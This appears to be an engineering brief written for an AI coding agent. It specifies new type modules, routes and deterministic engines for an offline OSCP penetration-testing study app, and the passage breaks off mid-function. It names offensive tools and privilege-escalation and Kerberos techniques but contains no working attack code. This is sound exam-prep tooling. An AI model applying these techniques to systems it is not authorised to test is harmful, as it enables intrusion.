---
title: CODE-PROMPT-v2-arsenal
purpose: Additive engineering brief — ADD F1–F8 to the already-running Cephalo build
target-repo: /home/vlad/bigOscpPrep
applies-to: the same self-driving build agent that runs _prompts/LOOP.md
contract: embeds the v2 ADDITIVE CONTRACT verbatim; binds additively to the FROZEN contract
version: v2
---

# CODE-PROMPT-v2 — THE ARSENAL / DETERMINISTIC-ENGINES UPGRADE

You are the Cephalo build agent. Cephalo already exists and builds in `/home/vlad/bigOscpPrep`
(Vite + React 18 SPA, TS strict, Zustand, prebuilt+serialized MiniSearch, `@xyflow/react`
mindmaps, `vite-plugin-pwa` offline, Rive octopus). A self-driving loop (`_prompts/LOOP.md`) is
already iterating content to a zero-gaps MASTER CHECKLIST. This brief is an **ADDITIVE** upgrade you
fold in. It adds eight feature clusters (F1–F8) as NEW modules, NEW routes, NEW datasets, NEW gates,
and NEW LOOP checklist blocks. It changes ZERO frozen files.

Read this whole brief before writing a line. Then drive every new `☐` to `☑` exactly as the existing
loop drives the existing checklist: a leaf is `☑` only when it is content-complete **and** its CI gate
is green.

---

## 0. INVARIANTS — READ FIRST, BAKED INTO EVERYTHING (LOUD, NON-NEGOTIABLE)

These five invariants are exam requirements, not preferences. Every feature you add is judged against
them. State them verbatim on-page (banner + per-feature chips) AND enforce them in CI.

### 0.1 ZERO AI — there is no model anywhere, at runtime or shipped
- No LLM, no embedding model, no inference, no ML lib, no "AI service". Every "smart" feature
  (Ask-the-Octopus intent F4, Privilege Advisor F3, CVE lookup F6, Decision-tree walk F5, Nmap triage
  F8) is a **pure deterministic function** over curated data + regex + the EXISTING serialized
  MiniSearch index.
- **No `Math.random`. No `Date.now`/`new Date()`/`performance.now`/`crypto.getRandomValues` in logic** —
  inject a clock; cosmetic timestamps (`parsedAt`, `generatedAt`) are EXCLUDED from test equality. This
  is GREP-ENFORCED in CI (G21), not merely snapshot-implied.
- Frozen stoplist + table-driven stemmer (no NLP dependency). Stable sort with `id` as the FINAL
  tiebreak everywhere. Reproducible to the byte.
- Every result carries an explain-why payload: `matchVia` / `matchedOn`+`matchedText` / `rawLine` /
  `triggeredBy`. Determinism is locked by golden snapshot tests.

### 0.2 EXAM-LEGAL FRAMING — personal, offline, deterministic notes; the human does everything
- Cephalo RETRIEVES author-written content with fixed rules and FILLS variables the user sets. It does
  NOT scan, exploit, automate, auto-download, or auto-run. The human selects, runs, and reasons about
  every command.
- Load-bearing distinction stated verbatim on-page: *AI GENERATES novel content / makes probabilistic
  decisions FOR you; Cephalo is Ctrl-F over your own notes with synonyms (F4) + a printed flowchart
  (F3/F5) + a static lookup table (F6) + a scan organizer (F8).*
- Persistent banner on EVERY route (extend `src/components/ResponsibleUseNote.tsx`, do not rewrite its
  frozen siblings): *"Cephalo is an offline, deterministic personal reference. NO AI, NO network, NO
  telemetry. It does not scan, exploit, or automate attacks — you run every command and make every
  decision. Verify current exam rules yourself."*
- Per-feature inline chip on `/ask`, `/advisor`, `/cve`, `/decision`, and the Paste-scan tab:
  *"Deterministic retrieval, not AI — here's why this matched."*

### 0.3 OFFLINE / LOCAL-FIRST — no runtime network, ever
- No telemetry, analytics, signup, or live CVE API. The serialized index + all v2 JSON artifacts are
  build-time emitted and rehydrated locally; `vite-plugin-pwa` precaches SAME-ORIGIN only.
- Pasted advisor enum input, CVE queries, and nmap pastes are **session-only**, never persisted to
  `localStorage` (may contain host data — same discipline as `PASS`/`NTHASH`/`AESKEY`).
- Theme switch is PROPOSED, not applied (`themeSwitch.autoApplied === false`; human confirms).
- Autofill NEVER overwrites a user-set variable (`conflictsWithUserValue` gates Apply).

### 0.4 NO BUNDLED BINARY — link official sources only
- Tool binaries / `.ps1` / `.exe` are NEVER hosted, bundled, or committed. F2/F6 link OFFICIAL sources
  only via the frozen `Reference` type (release PAGE, never a guessed pinned asset URL, never a
  `binaryUrl` field). Every `ToolBinary` carries the literal `fetchNote`.
- `searchsploit` is the only "tool" invoked and only as a copy-to-clipboard escape hatch the human runs
  locally. No machine names anywhere. Never commit the Trophy Room PDF.

### 0.5 ANTI-FABRICATION — never invent; mark `[UNVERIFIED]` + cite
- Never invent a CVE / EDB-id / flag / offset / version / CLSID / build-threshold / command / PowerView
  function. Uncertain ⇒ literal `[UNVERIFIED]` + non-empty `references[]` + a human reason (mirrors the
  frozen rule "unverified MUST carry references").
- NAME existence (a PowerView/PowerUp function, a flag, a CLSID) cannot be machine-verified; therefore CI
  enforces the **citation discipline** (G20: every unverified record carries refs + surfaces
  `[UNVERIFIED]`), not the fact. Author honestly; cite or flag.
- Defang-by-default placeholders only: `<tun0-ip>`, RFC5737 `198.51.100.0/24` & `192.0.2.0/24`, RFC3849
  `2001:db8::/32`, `example.local` / `example.lab`. Sensitive vars masked + session-only.

---

## 1. HARD RULES (violating any of these is a build failure)

1. **NEVER edit a frozen module.** `src/types/{content,engine,components,tokens}.ts` and
   `src/types/schema-parity.test.ts` stay BYTE-IDENTICAL. No new field on any frozen interface — no
   `toolBinaryId` on `Command`, no `navigateTo` on `OctopusMascotProps`, no `cve`/`intent`/`explain` on
   `SearchDoc`/`SearchHit`. New shapes live in NEW sibling modules that IMPORT frozen types.
2. **Reuse the ONE enum.** `Severity` / `Confidence` / `OS` / `Shell` / `CredMode` / `Phase` /
   `OctoState`. Never a parallel enum. Never `'activedirectory'` (OS is `'linux'|'windows'|'ad'`). F1
   needs no enum change — `'powershell'` is already in `Shell`.
3. **Never host/bundle/commit a binary.** Link the official release PAGE via `Reference`. No
   `binaryUrl`. No committed blob. Every `ToolBinary.fetchNote` is the literal string.
4. **Never invent.** No fabricated CVE/EDB/flag/version/CLSID/build/command/function name. Uncertain ⇒
   `[UNVERIFIED]` + `references[]` + reason. Document legacy + modern names side by side and flag the
   fork-divergent one `[UNVERIFIED]`.
5. **Deterministic only.** No `Math.random`, no ambient clock, no network, no NLP/ML lib. Inject clocks.
   Stable-sort with `id` as the final tiebreak.
6. **New entity ids use NEW namespaces** (`tool.*`, `sig.*`, `rule.*`, `alias.*`, `phrase.*`, `cve.*`,
   `dec.*`, `route.*`, `nmap.*`) that FK into frozen `Id`/`RefId` but are NOT themselves frozen `Id`s.
   `DecisionMap.id` and `ServiceRoute.id` are typed as the frozen `Id` string-alias purely for FK
   convenience (`Id` = `string`), but a `dec.*`/`route.*` value is NEVER registered in the frozen content
   Id-registry / `ContentBundle` — no frozen gate (Gates 1–14, schema-parity) treats it as canonical
   content. Only v2 gates (decision-reachability, nmap-route-coverage) resolve these namespaces.
7. **Props-in / events-out.** Every new component is pure-presentational; state lives in the parent +
   new Zustand stores (`ask` / `advisor` / `cve` / `decision` / `nmap`) + the pure engines. The frozen
   `OctopusMascot` is reused unmodified; its existing `onClick?:()=>void` is the F4 nav seam, owned by
   the App brand header.
8. **Frozen `ContentBundle` is NOT extended.** v2 datasets ship as the additive `CephaloV2Bundle` +
   per-dataset JSON artifacts emitted by `scripts/build-v2.ts` (Zod-validated), precached by
   `vite-plugin-pwa`.
9. **New `--cph-` keys only** in `src/types/tokens.v2.ts`. Code declares KEYS; design supplies VALUES.
   Meaning is never hue-only (CC-12): pair color + icon + text label.

---

## 2. FROZEN CONTRACT YOU BIND TO (do not modify; restated for binding)

```
OS = 'linux' | 'windows' | 'ad'           (theme attr data-os; never 'activedirectory')
PackId = 'oscp' | 'oswe' | 'osep' | (string & {})
Phase enum; Confidence = 'verified' | 'unverified'
Severity = 'info' | 'low' | 'medium' | 'high' | 'critical'
Shell = 'bash' | 'powershell' | 'cmd' | 'sql' | 'text'
CredMode = 'password' | 'nthash' | 'kerberos'   (variant-selection, NOT a template transform)
ArchetypeBand = 'core'|'high'|'medium'|'low'; VarGroup = 'network'|'target'|'auth'|'ad'|'web'|'files'|'misc'
OctoState = 'idle'|'greeting'|'listening'|'thinking'|'found'|'empty'|'copied'|'error'|'celebrate'
```
Frozen content interfaces: `VariableDef`, `VariableValidation`, `CommandVariant`, `Command`
(`template`, `variants[]`, `credMode?`, `severity`, `confidence`, `references[]`, `tags[]`,
`relatedIds[]`), `Technique`, `Section`, `Tag`, `MindMapNode`, `MindMapEdge`, `MindMap`,
`BloodHoundQuery`, `Reference` (`id`,`title`,`url`,`source`), `Pack`, `ContentBundle`.
Frozen engine: `TemplateEngine` — token `{{UPPER_SNAKE}}` + filters `quote|upper|lower|urlencode|b64`;
`RenderMode = 'filled'|'raw'|'display'`; render chain values → fallback → placeholder;
`allResolved`/`noInvalid`. Frozen search: `SearchDoc`, `SearchFilters`, `SearchOptions`, `SearchHit`,
`SearchEngine` (verified>unverified tiebreak via a build-time side table — already exists).

> **SEAM — `SearchEngine.search` takes an OBJECT, not a string.** The frozen signature is
> `search(o: SearchOptions): SearchHit[]` (`src/types/engine.ts:95`), where `SearchOptions` carries a
> `query` field (plus optional `filters`/`limit`). F4 intent MUST call
> `deps.search.search({ query })` — passing a bare string does NOT compile against the frozen engine.

Frozen components: `OctopusMascotProps`, `CommandCardProps`, `VariableBarProps`, `SearchPaletteProps`,
`MindMapProps`, `CredModeSwitch`. Frozen `--cph-*` token namespace as previously specified.

You **consume** these. You never alter them. Advisor renders commands via the FROZEN `TemplateEngine`
(it never string-builds). Intent runs OVER the FROZEN `SearchEngine.search({ query })`. Decision/Nmap
views use `@xyflow/react` with their OWN node/edge mapping — they do NOT go through `MindMapRenderModel`.

---

## 3. NEW ADDITIVE TYPE MODULES (write VERBATIM — single source of truth)

Create these files exactly. They import frozen types and add ZERO fields to them.

### 3.1 `src/types/arsenal.ts` (F1 cross-link + F2 provenance)

```ts
import type { Id, RefId, OS, Confidence } from './content';
export type ToolFormat = 'exe' | 'ps1' | 'py' | 'elf' | 'jar' | 'dll' | 'so' | 'script' | 'msi';
export type ToolCategory =
  | 'ad-enum' | 'ad-cred' | 'ad-lateral' | 'adcs' | 'bloodhound'
  | 'win-privesc' | 'win-enum' | 'potato'
  | 'linux-privesc' | 'linux-enum'
  | 'recon' | 'web' | 'relay' | 'pivot' | 'transfer' | 'cracking' | 'powershell-offensive';
export interface ToolBinary {
  id: string;                  // 'tool.rubeus'
  name: string;                // 'Rubeus'
  aliases?: string[];
  category: ToolCategory;
  format: ToolFormat[];
  runsOn: OS[];
  officialRef: RefId;          // FK → frozen Reference: canonical repo/project page (LINK ONLY)
  releaseRef?: RefId;          // FK → frozen Reference: releases/download PAGE (LINK ONLY; never a hosted blob)
  shipsOnKali: boolean;
  kaliPath?: string;
  fetchNote: string;           // REQUIRED literal: 'You fetch this yourself. Nothing is bundled or hosted by Cephalo.'
  relatedTechniqueIds?: Id[];  // FK → frozen Technique/Command ids
  relatedSignalIds?: string[]; // FK → PrivilegeSignal.id (advisor "fetch this tool")
  confidence: Confidence;      // 'unverified' MUST carry references
  references?: RefId[];
  tags?: string[];
  // INVARIANT (gate-enforced, not a field): NO binaryUrl, NO embedded artifact.
}
```

### 3.2 `src/types/advisor.ts` (F3 — deterministic, no AI)

```ts
import type { Id as Id2, RefId as RefId2, OS as OS2, Severity, Confidence as Conf2 } from './content';
export type EnumSource =
  | 'whoami-priv' | 'whoami-groups' | 'whoami-all'
  | 'sudo-l' | 'id' | 'getcap' | 'suid-find' | 'systeminfo' | 'uname' | 'ad-misc';
export interface PrivilegeSignal {
  id: string;                  // 'sig.win.seimpersonate', 'sig.linux.cap_setuid'
  os: OS2;
  source: EnumSource;
  label: string;               // 'SeImpersonatePrivilege (held)'
  match: { pattern: string; flags?: string; captures?: string[] };
  actionableStates?: ('enabled' | 'disabled' | 'present')[];
  sids?: string[];             // well-known SIDs for locale-safe group match (S-1-5-32-551 …)
  severity: Severity;
  description: string;
  references?: RefId2[];
  confidence: Conf2;
}
export interface SignalMatch {                     // runtime parser output (session-only, NEVER persisted)
  signalId: string;
  source: EnumSource;
  rawLine: string;
  state?: 'enabled' | 'disabled' | 'present';
  captures?: Record<string, string>;
}
export interface BuildGate { minBuild?: number; maxBuild?: number; }
export interface PrivilegeRule {
  id: string;                  // 'rule.win.seimpersonate.printspoofer'
  os: OS2;
  whenSignals: string[];       // signal ids; ALL present (AND). Use multiple rules for OR.
  buildGate?: BuildGate;
  recommendsTechniqueId: Id2;
  commandId?: Id2;             // rendered via FROZEN TemplateEngine; advisor never string-builds
  toolBinaryId?: string;
  rank: number;                // lower = higher priority; tie-break by id
  rationale: string;
  unverifiedReason?: string;   // REQUIRED when confidence==='unverified'
  decisionNodeId?: string;     // hand-off into F5
  cveLookupHint?: string;      // hand-off into F6
  confidence: Conf2;
  references?: RefId2[];        // REQUIRED when unverified
}
export interface AdvisorRecommendation { rule: PrivilegeRule; triggeredBy: SignalMatch[]; unverified: boolean; }
export interface ParsedBuildInfo { os: OS2; buildNumber?: number; productName?: string; kernel?: string; }
```

### 3.3 `src/types/ask.ts` (F4 — deterministic layer OVER frozen MiniSearch)

```ts
import type { Id as Id3, OS as OS3, Shell, Confidence as Conf3 } from './content';
export interface IntentAlias {
  id: string;                  // 'alias.kerberoast'
  canonical: string;           // 'kerberoast'
  aliases: string[];           // ['kerberoasting','roast spns','tgs crack']
  techniqueIds?: Id3[]; commandIds?: Id3[]; toolBinaryIds?: string[];
  signalKey?: string;          // privilege → bridge to F3 PrivilegeSignal.id
  os?: OS3[]; weight?: number;
}
export interface PhrasebookEntry {
  id: string;                  // 'phrase.dump-hashes-powershell'
  phrasings: string[];
  requireAll?: string[];       // hard-gate tokens that MUST be present post-normalize
  intent: string;
  techniqueIds?: Id3[]; commandIds?: Id3[];
  requiresSignals?: string[];  // bridge to F3 advisor
  shell?: Shell; os?: OS3[];
  minOverlap?: number;         // default 0.6 token-Jaccard
  rationale: string;
  confidence: Conf3;
}
export type IntentMatchVia = 'phrasebook' | 'alias' | 'search';
export interface IntentResolution {
  query: string; normalized: string;
  matchVia: IntentMatchVia;
  matchedRecordId?: string;
  techniqueIds: Id3[]; commandIds: Id3[]; signalIds?: string[];
  searchFallbackUsed: boolean; explanation: string;
}
```

### 3.4 `src/types/cve.ts` (F6 — bundled, offline, no API)

```ts
import type { RefId as RefId4, Id as Id4, Confidence as Conf4 } from './content';
export interface VersionRange {
  exact?: string;
  introduced?: string;         // inclusive lower bound
  fixedExclusive?: string;     // exclusive upper bound
  prefix?: string;             // '2.4.' ⇒ 2.4.x
  any?: boolean;               // product-wide ⇒ FORCES unverified handling
  expression?: string;         // human note only
}
export type ExploitType = 'remote' | 'local' | 'webapps' | 'dos' | 'priv-esc' | 'shellcode' | 'hardware';
export interface CveExploitEntry {
  id: string;                  // 'cve.proftpd.135.modcopy'
  product: string;
  productAliases?: string[];
  versionRange: VersionRange;
  cveId?: string;              // /^CVE-\d{4}-\d{4,}$/  (absent ⇒ [UNVERIFIED])
  title: string;
  edbId?: string;
  searchsploitTerm: string;    // EXACT offline term
  exploitType: ExploitType;
  platform?: 'linux'|'windows'|'unix'|'multiple'|'php'|'java'|'hardware';
  requiresAuth?: boolean;
  ref: RefId4;                 // REQUIRED
  references?: RefId4[];
  relatedTechniqueId?: Id4;
  notes?: string;
  confidence: Conf4;
}
export interface CveMatch { entry: CveExploitEntry; matchKind: 'exact' | 'in-range' | 'product-only'; unverified: boolean; }
```

### 3.5 `src/types/decision.ts` (F5 output-conditional; F7 AD trees)

```ts
import type { Id as Id5, OS as OS5, Phase, Severity as Sev5, Confidence as Conf5, PackId } from './content';
import type { RefId as RefId5 } from './content';
export type DecisionNodeKind = 'start' | 'check' | 'branch' | 'action' | 'outcome' | 'note';
export interface ObservableSignal {
  id: string; label: string;
  match: 'contains' | 'regex' | 'signalRef'; // 'signalRef' ⇒ value is a PrivilegeSignal.id (DRY with F3)
  value: string; caseInsensitive?: boolean;  // default ci=true + trim
}
export interface DecisionNode {
  id: string;                  // 'dec.win.tokenpriv.whoami'
  kind: DecisionNodeKind; label: string;
  checkCommandId?: Id5;        // preferred; no duplication
  inlineTemplate?: string;     // fallback only when no Command exists
  techniqueId?: Id5; actionCommandId?: Id5; toolBinaryId?: string;
  os?: OS5; severity?: Sev5;
  observes?: ObservableSignal[];
  outcomeKind?: 'system' | 'root' | 'da' | 'creds' | 'dead-end';
  confidence?: Conf5; unverified?: boolean; references?: RefId5[];
  position?: { x: number; y: number };
}
export interface DecisionEdge {
  id: string; source: string; target: string; label?: string;
  condition:
    | { kind: 'if-found'; signalId: string }
    | { kind: 'if-absent'; signalId: string }
    | { kind: 'else' };
  priority?: number;           // lower evaluated first
  confidence?: Conf5;
}
export interface DecisionMap {
  id: Id5;                     // 'dec.win.tokenpriv' — Id string-alias; NOT a registered content Id (HARD RULE 6)
  title: string; os: OS5; phase?: Phase;
  rootNodeId: string; nodes: DecisionNode[]; edges: DecisionEdge[];
  legend?: string; layout?: 'dagre' | 'tree' | 'manual';
  packs: PackId[]; references?: RefId5[]; confidence: Conf5;
}
export interface DecisionStep { fromNodeId: string; chosenEdge: DecisionEdge; nextNodeId: string; }
```

### 3.6 `src/types/nmap.ts` (F8 — triage / scan router)

```ts
import type { Id as Id6, OS as OS6, Severity as Sev6, RefId as RefId6, Confidence as Conf6 } from './content';
export type NmapInputFormat = 'human' | 'grep' | 'xml' | 'unknown';
export type Transport = 'tcp' | 'udp' | 'sctp';
export type PortState = 'open' | 'filtered' | 'closed' | 'open|filtered' | 'closed|filtered' | 'unfiltered';
export interface NmapScript { id: string; output: string; }
export interface NmapPort {
  port: number; proto: Transport; state: PortState;
  service?: string; product?: string; version?: string; extrainfo?: string;
  banner?: string;             // raw service/version blob — SOURCE OF TRUTH
  tunnel?: 'ssl'; scripts?: NmapScript[];
}
export interface NmapHost {
  ip?: string; hostname?: string;
  os?: OS6; osEvidence?: string[];
  status?: 'up' | 'down' | 'unknown';
  ports: NmapPort[];           // open + open|filtered only (post parse-filter)
  hostScripts?: NmapScript[];
}
export interface NmapParseResult {
  format: NmapInputFormat; hosts: NmapHost[]; warnings: string[];
  rawLineCount: number; parsedAt: string;   // COSMETIC; injectable clock; EXCLUDED from test equality
}
export type RouteMatch =
  | { by: 'port'; port: number; proto?: Transport }
  | { by: 'service'; serviceRegex: string }
  | { by: 'product'; productRegex: string }
  | { by: 'portService'; port: number; serviceRegex: string };
export interface ServiceRoute {
  id: string;                  // 'route.smb','route.ldap.ad' — Id string-alias; NOT a registered content Id (HARD RULE 6)
  label: string; match: RouteMatch;
  techniqueIds: Id6[];         // FK → REAL existing frozen Technique.id
  realmHint?: OS6; realmWeight?: number;
  realmCategory?: 'kerberos' | 'ldap' | 'smb' | 'rdp' | 'winrm' | 'nix';
  severity: Sev6; cveCandidate?: boolean; note?: string; references?: RefId6[];
}
export interface RouteFiring {
  route: ServiceRoute; host: string; port: number; proto: Transport;
  matchedOn: 'port' | 'service' | 'product' | 'portService';
  matchedText: string;
  techniqueIds: Id6[]; severity: Sev6;
}
export interface CveHandoff { query: { product?: string; version?: string; service?: string; port: number }; entryIds: Id6[]; unverified: boolean; }
export interface PortTriage { port: NmapPort; firings: RouteFiring[]; techniqueIds: Id6[]; cve?: CveHandoff; }
export interface RealmInference { os: OS6; confidence: Conf6; scores: Record<OS6, number>; evidence: string[]; }
export interface AutofillProposal { varId: string; value: string; source: string; confidence: Conf6; conflictsWithUserValue: boolean; }
export interface HostTriage { host: NmapHost; realm: RealmInference; ports: PortTriage[]; autofill: AutofillProposal[]; }
export interface NmapTriageResult {
  parse: NmapParseResult; hosts: HostTriage[];
  themeSwitch?: { proposedOs: OS6; reason: string; autoApplied: false };
  warnings: string[];
}
```

### 3.7 `src/types/bundle.v2.ts` (additive aggregate; frozen ContentBundle NOT extended)

```ts
import type { ToolBinary as TB } from './arsenal';
import type { PrivilegeSignal as PS, PrivilegeRule as PR } from './advisor';
import type { IntentAlias as IA, PhrasebookEntry as PB } from './ask';
import type { CveExploitEntry as CE } from './cve';
import type { DecisionMap as DM } from './decision';
import type { ServiceRoute as SR } from './nmap';
export interface CephaloV2Bundle {
  schemaVersion: number; generatedAt: string;
  toolBinaries: TB[]; signals: PS[]; rules: PR[];
  intentAliases: IA[]; phrasebook: PB[]; cve: CE[]; decisions: DM[]; nmapRoutes: SR[];
}
```

---

## 4. NEW `--cph-` TOKEN KEYS — `src/types/tokens.v2.ts` (frozen `tokens.ts` untouched)

```ts
export const TOKEN_KEYS_V2 = {
  ask:      ['--cph-ask-bg','--cph-ask-surface','--cph-ask-input-bg','--cph-ask-octo-halo',
             '--cph-ask-suggestion','--cph-ask-result-accent','--cph-ask-explain-fg',
             '--cph-intent-pin-accent','--cph-octo-large-glow'],
  advisor:  ['--cph-advisor-signal-detected','--cph-advisor-signal-strong','--cph-advisor-signal-weak',
             '--cph-advisor-signal-unverified','--cph-advisor-rank-1','--cph-advisor-rank-track'],
  decision: ['--cph-dec-node-check','--cph-dec-node-action','--cph-dec-node-outcome-system',
             '--cph-dec-node-outcome-da','--cph-dec-branch-if-found','--cph-dec-branch-if-absent',
             '--cph-dec-branch-else','--cph-dec-branch-manual','--cph-dec-trace'],
  tool:     ['--cph-tool-verified-src','--cph-tool-kali-path-bg','--cph-tool-fetch-warn'],
  cve:      ['--cph-cve-match-exact','--cph-cve-match-fuzzy','--cph-cve-degraded','--cph-cve-edb-bg'],
  nmap:     ['--cph-nmap-realm-ad','--cph-nmap-realm-windows','--cph-nmap-realm-linux',
             '--cph-nmap-confirm-bg','--cph-nmap-explain-fg'],
  shared:   ['--cph-unverified-badge-bg','--cph-unverified-badge-fg'],
} as const;
```
`scripts/gate-tokens.ts` (edited, NOT frozen):
`ALL_KEYS = [...Object.values(TOKEN_KEYS).flat(), ...Object.values(TOKEN_KEYS_V2).flat()]`.
Reuse frozen `--cph-sev-*` (row/severity heat), `--cph-node-*` (technique chips), `--cph-var-*`
(autofill panel), `--cph-confidence-*` / `--cph-octo-*` as-is. CC-12: meaning never hue-only — pair
color + icon + text label. Design fills `theme.{base,linux,windows,ad}.css`; `data-os` swaps with no
remount.

---

## 5. ROUTES + COMPONENT WIRING (props-in / events-out; NO frozen prop edits)

### 5.1 Routes — `src/routes/router.tsx` (NOT frozen; mirror existing `mindmapRoute.validateSearch`)

```
/ask                    → AskOctopusView         (F4 big octopus + summon box + 'Paste scan' tab = F8)
/advisor   /$os/advisor → PrivilegeAdvisorView    (F3)
/cve                    → CveLookupView           (F6)
/arsenal                → ToolArsenalView          (F2)
/$os/decision/$mapId    → DecisionMindMapView      (F5/F7), validateSearch: { node?: string }
```
`OctopusMascot` click → `/ask` uses the EXISTING frozen `onClick?:()=>void`; the App brand header
PARENT owns the navigation. **DO NOT add `navigateTo` to `OctopusMascotProps`.** `AskOctopusHero` is a
NEW wrapper COMPOSING the frozen mascot (svg is 100% w/h → container governs scale) + halo/particle
layers using new `--cph-ask-*` / `--cph-octo-large-glow`.

### 5.2 Additive prop types — `src/types/components.v2.ts` (pure presentational)

```ts
import type { Id, OS, RefId } from './content';
import type { OctoState } from './components';
import type { IntentResolution } from './ask';
import type { SignalMatch, AdvisorRecommendation, EnumSource } from './advisor';
import type { CveMatch } from './cve';
import type { ToolBinary } from './arsenal';
import type { DecisionMap, DecisionEdge } from './decision';
import type { NmapTriageResult, HostTriage } from './nmap';   // HostTriage re-synced w/ canonical contract
export interface AskOctopusProps { octoState: OctoState; theme: OS; reducedMotion?: boolean; query: string;
  resolution?: IntentResolution; mode: 'summon' | 'paste-scan'; nmap?: NmapTriageResult;
  onQueryChange:(q:string)=>void; onSubmit:(q:string)=>void; onModeChange:(m:'summon'|'paste-scan')=>void;
  onPasteScan:(raw:string)=>void; onSelectTechnique:(id:Id)=>void; onCopyCommand:(id:Id,text:string)=>void;
  onConfirmTheme:(os:OS)=>void; onApplyAutofill:(varId:string,value:string)=>void; }
export interface PrivilegeAdvisorProps { theme: OS; source: EnumSource; rawInput: string;
  matches: SignalMatch[]; recommendations: AdvisorRecommendation[];
  onSourceChange:(s:EnumSource)=>void; onInputChange:(t:string)=>void; /* session-only; NEVER persisted */
  onParse:()=>void; onCopyCommand:(id:Id,text:string)=>void; onOpenTechnique:(id:Id)=>void; onFetchTool:(id:string)=>void; }
export interface CveLookupProps { product: string; version: string; matches: CveMatch[];
  onQueryChange:(p:string,v:string)=>void; onCopySearchsploit:(term:string)=>void; onOpenReference:(r:RefId)=>void; }
export interface ToolArsenalProps { tools: ToolBinary[]; filter?: { category?: string; os?: OS };
  onFilterChange:(f:{category?:string;os?:OS})=>void; onOpenSource:(r:RefId)=>void; }
export interface DecisionMindMapProps { map: DecisionMap; theme: OS; reducedMotion?: boolean;
  currentNodeId: string; walkedPath: string[];
  onRunCheck:(id:Id)=>void; onPickBranch:(e:DecisionEdge)=>void; onOpenTechnique:(id:Id)=>void; }
export interface NmapTriageBoardProps { result: NmapTriageResult; theme: OS;
  onConfirmTheme:(os:OS)=>void; onApplyAutofill:(varId:string,value:string)=>void;
  onOpenTechnique:(id:Id)=>void; onOpenCve:(id:Id)=>void; }
// HostTriage is imported for board-row prop typing (per-host panels destructure HostTriage from
// NmapTriageResult.hosts[]); keeps this block byte-aligned with the canonical contract's import list.
```
`DecisionMindMapView` / `NmapTriageBoard` use `@xyflow/react` with their OWN node/edge mapping — they
do NOT go through the frozen `MindMapRenderModel` (it has no condition/data fields). `MindMapProps`
untouched.

### 5.3 Zustand stores (new, session-only state)
`src/store/{ask,advisor,cve,decision,nmap}Store.ts` — each holds the in-flight input + last result.
`advisor.rawInput`, `cve` query, `nmap` paste, and the decision walk trace are SESSION-ONLY; never
written to `localStorage`. Same masking discipline as `PASS`/`NTHASH`/`AESKEY`. These stores are ALSO
covered by the no-ambient-clock grep gate (G21): no `Date.now`/`Math.random` in store logic.

---

## 6. THE DETERMINISTIC ENGINES (pure TS, with unit tests)

All engines are pure functions: `(input, curated-data, injected-clock?) → result`. No I/O, no clock,
no random, no network. Every engine ships a Vitest spec with **golden snapshot** fixtures that freeze
the ordered output ids. Any random/Date/network leak breaks the snapshot AND trips the G21 grep gate —
that is the determinism gate, enforced two ways.

### 6.1 F4 intent — `src/engine/intent.ts`

Pipeline (verbatim spec): (1) normalize NFKD → lowercase → strip-punct → collapse-ws → tokenize, remove
stopwords from a CURATED stoplist that KEEPS load-bearing short tokens (`ad`,`sam`,`spn`,`smb`,`rce`,
`suid`,`db`,`ca`), tiny table-driven stemmer (no NLP lib); (2) greedy longest-match alias expansion
(when an alias matches, append the alias's `canonical` tokens to the expanded query — there is NO
`expandsTo` field; expansion is via `canonical` only); (3) privilege short-circuit — alias `signalKey` /
phrase `requiresSignals` pins an Advisor hand-off card; (4) phrasebook match gated on `requireAll`,
score = token-Jaccard `≥ minOverlap`, pins `intent.techniqueIds/commandIds` (rank 0); (5) index fallback
= `searchEngine.search({ query })` on the expanded query; (6) merge+dedup by id, stable final tiebreak
on `id`; (7) every card shows an explain-why chip (`matchVia` + matched phrase/alias/field).

```ts
import type { IntentAlias, PhrasebookEntry, IntentResolution } from '../types/ask';
import type { SearchEngine } from '../types/engine';

const STOPLIST = new Set([
  'a','an','the','to','of','for','with','how','do','i','can','what','in','on','using','use','my','me',
  'find','way','get','please','want','need','some','this','that','via','and',
]); // CURATED: never includes ad/sam/spn/smb/rce/suid/db/ca

const STEM_TABLE: ReadonlyArray<[RegExp,string]> = [
  [/ing$/,''],[/ers$/,'er'],[/s$/,''],[/ed$/,''],
]; // tiny table-driven stemmer, applied once, longest-first

export function normalize(q: string): string {
  return q.normalize('NFKD').toLowerCase().replace(/[^\p{L}\p{N}\s]/gu,' ').replace(/\s+/g,' ').trim();
}
export function tokenize(norm: string): string[] {
  return norm.split(' ').filter(Boolean)
    .filter(t => !STOPLIST.has(t))
    .map(stem);
}
function stem(t: string): string {
  if (t.length <= 3) return t; // protect short load-bearing tokens
  for (const [re, rep] of STEM_TABLE) { if (re.test(t)) return t.replace(re, rep); }
  return t;
}
function jaccard(a: string[], b: string[]): number {
  const A = new Set(a), B = new Set(b);
  let inter = 0; A.forEach(x => { if (B.has(x)) inter++; });
  const union = new Set([...a, ...b]).size;
  return union === 0 ? 0 : inter / union;
}

// SEAM: typed against the FROZEN engine; search consumes a SearchOptions OBJECT, never a bare string.
export interface IntentDeps {
  aliases: IntentAlias[];
  phrasebook: PhrasebookEntry[];
  search: Pick<SearchEngine,'search'>;   // search(o: SearchOptions): SearchHit[]
}

export function resolveIntent(query: string, deps: IntentDeps): IntentResolution {
  const normalized = normalize(query);
  let tokens = tokenize(normalized);

  // (2) greedy longest-match alias expansion (sorted longest alias first → deterministic)
  const aliasHits: IntentAlias[] = [];
  const expanded = new Set(tokens);
  const sortedAliases = [...deps.aliases].sort(
    (x, y) => maxAliasLen(y) - maxAliasLen(x) || x.id.localeCompare(y.id));
  for (const a of sortedAliases) {
    const phrases = [a.canonical, ...a.aliases].map(normalize);
    if (phrases.some(p => normalized.includes(p))) {
      aliasHits.push(a);
      tokenize(a.canonical).forEach(t => expanded.add(t)); // expand via canonical only (no expandsTo)
    }
  }
  const expandedTokens = [...expanded];

  // (3) privilege short-circuit
  const signalIds = aliasHits.flatMap(a => (a.signalKey ? [a.signalKey] : []));

  // (4) phrasebook match (requireAll gate + Jaccard ≥ minOverlap), rank 0
  let best: { entry: PhrasebookEntry; score: number } | null = null;
  for (const e of deps.phrasebook) {
    if (e.requireAll && !e.requireAll.every(r => expandedTokens.includes(stem(normalize(r))))) continue;
    const minOverlap = e.minOverlap ?? 0.6;
    let score = 0;
    for (const ph of e.phrasings) score = Math.max(score, jaccard(expandedTokens, tokenize(ph)));
    if (score >= minOverlap && (!best || score > best.score ||
        (score === best.score && e.id.localeCompare(best.entry.id) < 0))) {
      best = { entry: e, score };
    }
  }
  if (best) {
    return {
      query, normalized, matchVia: 'phrasebook', matchedRecordId: best.entry.id,
      techniqueIds: dedup(best.entry.techniqueIds ?? []),
      commandIds: dedup(best.entry.commandIds ?? []),
